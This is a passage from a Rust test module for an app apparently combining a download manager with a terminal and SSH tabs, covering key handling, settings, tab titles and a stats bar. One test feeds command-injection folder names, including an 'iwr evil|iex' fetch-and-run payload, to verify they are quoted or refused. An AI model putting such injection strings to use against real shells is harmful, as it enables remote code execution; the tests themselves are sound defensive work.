        assert_eq!(bytes(tr(&[key(K::F5, NONE)], NONE)), b"\x1b[15~");
        assert_eq!(bytes(tr(&[key(K::Escape, NONE)], NONE)), b"\x1b");
        assert_eq!(bytes(tr(&[key(K::Enter, NONE)], NONE)), b"\r");
        assert_eq!(bytes(tr(&[key(K::Backspace, NONE)], NONE)), b"\x7f");
        assert_eq!(bytes(tr(&[key(K::Tab, SHIFT)], SHIFT)), b"\x1b[Z");
    }

    #[test]
    fn releases_are_ignored() {
        let up = Event::Key { key: K::A, physical_key: None, pressed: false, repeat: false, modifiers: NONE };
        assert!(tr(&[up], NONE).is_empty());
    }

    fn unique() -> String {
        format!("{}-{}", std::process::id(), std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos())
    }

    #[test]
    fn layout_setting_parses_and_defaults_to_a() {
        assert_eq!(TerminalLayout::from_setting(None), TerminalLayout::A);
        assert_eq!(TerminalLayout::from_setting(Some("b")), TerminalLayout::B);
        assert_eq!(TerminalLayout::from_setting(Some("B")), TerminalLayout::B);
        assert_eq!(TerminalLayout::from_setting(Some("x")), TerminalLayout::A);
        assert_eq!(TerminalLayout::B.as_setting(), "b");
        assert_eq!(TerminalLayout::A.as_setting(), "a");
    }

    #[test]
    fn app_shortcuts_are_off_only_while_the_terminal_has_focus() {
        assert!(shortcuts_enabled(false, true), "on other screens the shortcuts work");
        assert!(shortcuts_enabled(true, false), "terminal screen but focus is elsewhere (e.g. a dialog)");
        assert!(!shortcuts_enabled(true, true), "Ctrl+N and Delete belong to the program while the terminal is focused");
    }

    #[test]
    fn font_size_setting_is_clamped_and_defaults() {
        assert_eq!(font_size_from_setting(None), 13.0);
        assert_eq!(font_size_from_setting(Some("abc")), 13.0);
        assert_eq!(font_size_from_setting(Some("5")), 8.0);
        assert_eq!(font_size_from_setting(Some("99")), 32.0);
        assert_eq!(font_size_from_setting(Some("14.5")), 14.5);
    }

    #[test]
    fn start_folder_falls_back_to_downloads() {
        let home = std::env::temp_dir().join(format!("uk-home-{}", unique()));
        std::fs::create_dir_all(home.join("Downloads")).unwrap();
        let real = std::env::temp_dir().join(format!("uk-start-{}", unique()));
        std::fs::create_dir_all(&real).unwrap();
        assert_eq!(start_dir(Some(real.to_str().unwrap()), Some(&home)), real, "an existing folder setting is used");
        assert_eq!(start_dir(Some("C:\\folder\\yang\\tidak\\ada"), Some(&home)), home.join("Downloads"), "a missing folder falls back");
        assert_eq!(start_dir(None, Some(&home)), home.join("Downloads"));
        assert_eq!(start_dir(Some("  "), Some(&home)), home.join("Downloads"), "blank means default");
        assert_eq!(start_dir(None, None), std::env::current_dir().unwrap(), "no home: the working folder");
        std::fs::remove_dir_all(home).ok();
        std::fs::remove_dir_all(real).ok();
    }

    #[test]
    fn tab_title_prefers_the_program_title_but_stays_short() {
        assert_eq!(tab_title("Terminal", None), "Terminal");
        assert_eq!(tab_title("Terminal", Some("")), "Terminal");
        assert_eq!(tab_title("Terminal", Some("vim notes.txt")), "vim notes.txt");
        let long = "x".repeat(60);
        let t = tab_title("Terminal", Some(&long));
        assert!(t.chars().count() <= 24 && t.ends_with('\u{2026}'), "{t}");
        assert_eq!(tab_title("T", Some("\u{4F60}\u{597D}")), "\u{4F60}\u{597D}", "multi-byte titles are cut on character boundaries");
    }

    #[test]
    fn terminal_folder_for_a_download_is_its_parent_or_itself() {
        let root = std::env::temp_dir().join(format!("uk-dl-{}", unique()));
        let folder = root.join("Torrent Name");
        std::fs::create_dir_all(&folder).unwrap();
        let file = root.join("setup.exe");
        std::fs::write(&file, b"x").unwrap();
        assert_eq!(terminal_dir_for(file.to_str().unwrap()), root, "a single file opens its parent");
        assert_eq!(terminal_dir_for(folder.to_str().unwrap()), folder, "a multi-file torrent folder opens itself");
        let gone = root.join("hilang").join("a.bin");
        assert_eq!(terminal_dir_for(gone.to_str().unwrap()), root, "a missing path falls back to the nearest folder that exists");
        std::fs::remove_dir_all(root).ok();
    }

    #[test]
    fn ssh_tab_title_names_the_route() {
        assert_eq!(ssh_tab_labels("web-prod", &["bastion-b".to_string()]), ("web-prod".to_string(), "via bastion-b".to_string()));
        assert_eq!(ssh_tab_labels("web-prod", &["a".to_string(), "b".to_string()]).1, "via a \u{2192} b");
        assert_eq!(ssh_tab_labels("nas", &[]).1, "langsung");
    }

    #[test]
    fn cd_command_never_lets_a_folder_name_run_code() {
        use unduhkilat_core::term::local::ShellKind::*;
        let evil = r"C:\dl\x$(iwr evil|iex)";
        assert_eq!(cd_command(PowerShell, evil).unwrap(), format!("{}\r", r"Set-Location -LiteralPath 'C:\dl\x$(iwr evil|iex)'"), "single quotes do not expand $() in PowerShell");
        assert_eq!(cd_command(PowerShell, r"C:\dl\[Subs] it's").unwrap(), format!("{}\r", r"Set-Location -LiteralPath 'C:\dl\[Subs] it''s'"), "brackets are literal and quotes are doubled");
        assert_eq!(cd_command(Cmd, r"D:\a b\c").unwrap(), format!("{}\r", r#"cd /d "D:\a b\c""#), "CMD needs /d to change drive");
        assert!(cd_command(Cmd, r"C:\%PATH%\x").is_none(), "CMD would expand %VAR%: refuse");
        assert!(cd_command(Cmd, r#"C:\a"&calc\x"#).is_none(), "a quote could end the argument: refuse");
        assert!(cd_command(PowerShell, "C:\\a\r\nb").is_none(), "line breaks are refused");
        assert!(cd_command(GitBash, r"C:\a").is_none() && cd_command(Wsl, r"C:\a").is_none(), "only PowerShell and CMD");
    }

    #[test]
    fn ctrl_shift_c_and_v_arrive_as_key_events_and_never_interrupt() {
        // egui-winit only makes Copy/Paste events for Ctrl+C/V without Shift; Ctrl+Shift+C/V are plain keys.
        assert_eq!(tr(&[key(K::C, CTRL_SHIFT)], CTRL_SHIFT), vec![TermInput::Copy], "must not send ^C (0x03)");
        assert_eq!(translate_events(&[key(K::C, CTRL_SHIFT)], &modes(), true, true, &ctx(CTRL_SHIFT)), vec![TermInput::Copy]);
        assert_eq!(tr(&[key(K::V, CTRL_SHIFT)], CTRL_SHIFT), vec![TermInput::RequestPaste]);
        assert_eq!(bytes(tr(&[key(K::C, CTRL)], CTRL)), b"\x03", "plain Ctrl+C is unchanged");
    }

    #[test]
    fn ime_commit_becomes_text() {
        let ev = Event::Ime(egui::ImeEvent::Commit("\u{4F60}\u{597D}".into()));
        assert_eq!(bytes(tr(&[ev], NONE)), "\u{4F60}\u{597D}".as_bytes());
        assert!(tr(&[Event::Ime(egui::ImeEvent::Preedit { text: "ni".into(), active_range_chars: None })], NONE).is_empty(), "composition in progress sends nothing");
    }

    #[test]
    fn eframe_is_built_with_the_system_clipboard() {
        // Without eframe's "clipboard" feature egui-winit keeps copy/paste inside the process:
        // Ctrl+V never sees text copied elsewhere and Ctrl+C never reaches Windows.
        let manifest = include_str!("../Cargo.toml");
        let eframe_line = manifest.lines().find(|l| l.trim_start().starts_with("eframe")).expect("eframe dependency");
        assert!(eframe_line.contains("\"clipboard\""), "eframe features must include clipboard: {eframe_line}");
    }

    #[test]
    fn alt_v_on_an_ssh_tab_asks_for_an_image_upload() {
        let ssh = KeyContext { mods: ALT, insert_down: false, alt_v_image: true };
        assert_eq!(translate_events(&[key(K::V, ALT)], &modes(), false, true, &ssh), vec![TermInput::PasteImage]);
        let local = KeyContext { alt_v_image: false, ..ssh };
        assert_eq!(bytes(translate_events(&[key(K::V, ALT)], &modes(), false, true, &local)), b"\x1bv", "elsewhere Alt+V still reaches the program");
        assert!(!translate_events(&[key(K::V, CTRL)], &modes(), false, true, &ssh).contains(&TermInput::PasteImage), "Ctrl+V is not Alt+V");
    }

    #[test]
    fn preview_limit_setting_is_clamped_and_defaults() {
        assert_eq!(preview_mb_from_setting(None), 25);
        assert_eq!(preview_mb_from_setting(Some("abc")), 25);
        assert_eq!(preview_mb_from_setting(Some("0")), 1);
        assert_eq!(preview_mb_from_setting(Some("9999")), 500);
        assert_eq!(preview_mb_from_setting(Some(" 40 ")), 40);
    }
}

#[cfg(test)]
mod stats_bar_tests {
    use super::stats_parts;
    use unduhkilat_core::server::stats::ServerStats;

    #[test]
    fn reads_like_the_mobaxterm_bar() {
        let s = ServerStats { cpu_pct: Some(6.2), mem_used_kb: 3_733_000, mem_total_kb: 7_800_000, conns: vec![(443, 4), (2477, 3)], procs_running: 2, procs_total: 1185, uptime_secs: 16 * 86_400, user: "ekohadi".into(), user_sessions: 3, disk_root_pct: Some(77) };
        let text: Vec<String> = stats_parts(&s).into_iter().map(|p| p.0).collect();
        assert_eq!(text, vec!["CPU 6%", "RAM 3.56 GB / 7.44 GB", "Koneksi: 4 (port 443), 3 (port 2477)", "Proses 2/1185", "Uptime 16 hari", "ekohadi (x3)", "Disk /: 77%"]);
    }

    #[test]
    fn full_disk_and_memory_stand_out() {
        let s = ServerStats { mem_used_kb: 95, mem_total_kb: 100, disk_root_pct: Some(93), ..Default::default() };
        let parts = stats_parts(&s);
        assert!(parts[1].2, "RAM at 95% is highlighted");
        assert!(parts.last().unwrap().2, "disk at 93% is highlighted");
        assert_eq!(parts[0].0, "CPU \u{2026}", "first reading has no CPU percentage yet");
    }
}
